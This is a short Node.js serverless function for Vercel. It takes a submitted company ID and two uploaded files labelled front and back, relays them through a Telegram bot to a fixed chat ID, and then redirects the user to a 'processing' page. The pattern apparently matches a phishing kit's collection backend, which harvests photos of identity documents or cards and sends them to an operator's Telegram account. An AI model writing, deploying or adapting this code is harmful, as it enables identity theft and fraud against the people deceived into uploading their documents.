// Use 'require' for internal Node modules for maximum Vercel compatibility
const fs = require('fs');
const FormData = require('form-data');
const formidable = require('formidable');
const axios = require('axios');

// NOTE: Set your Telegram Bot Token as a Vercel Environment Variable 
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN; 
const CHAT_ID = '8483934112'; 

// IMPORTANT: Vercel serverless functions exports format
export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }
    
    if (!BOT_TOKEN) {
        console.error("TELEGRAM_BOT_TOKEN environment variable is not set!");
        return res.status(500).send('Configuration Error: Missing Bot Token');
    }

    const form = formidable({});
    
    let fields;
    let files;
    
    try {
        [fields, files] = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) {
                    reject(err);
                } else {
                    resolve([fields, files]);
                }
            });
        });
    } catch (err) {
        console.error('Formidable Parse Error:', err);
        return res.status(500).send('File Upload Processing Failed');
    }

    // Adapt fields to simple string values
    const companyId = fields.companyId ? fields.companyId[0] : '';
    const frontFile = files.frontUpload ? files.frontUpload[0] : null;
    const backFile = files.backUpload ? files.backUpload[0] : null;

    // --- Helper function to send files ---
    async function sendDocument(chatId, file) {
        if (!file || file.size === 0) return;

        const formData = new FormData();
        formData.append('chat_id', chatId);
        
        // Ensure the file exists before creating a stream
        if (!fs.existsSync(file.filepath)) {
             console.error(`File path does not exist: ${file.filepath}`);
             return;
        }

        const fileStream = fs.createReadStream(file.filepath);
        
        formData.append('document', fileStream, {
            filename: file.originalFilename,
            contentType: file.mimetype,
        });

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
        
        try {
            await axios.post(url, formData, {
                headers: formData.getHeaders(),
            });
        } catch (error) {
            console.error('Telegram Send Document Error:', error.response?.data || error.message);
        }
    }
    
    // --- Helper function to send messages ---
    async function sendMessage(chatId, text) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            await axios.post(url, {
                chat_id: chatId,
                text: text,
            });
        } catch (error) {
            console.error('Telegram Send Message Error:', error.response?.data || error.message);
        }
    }

    // 4. Execution
    if (companyId) {
        await sendMessage(CHAT_ID, `📌 New Submission\nCompany ID: ${companyId}`);
    }

    await sendDocument(CHAT_ID, frontFile);
    await sendDocument(CHAT_ID, backFile);
    
    await sendMessage(CHAT_ID, "✅ All files and data received successfully.");

    // 5. Redirect the user
    res.setHeader('Location', '/processing.html');
    res.status(302).end();
}
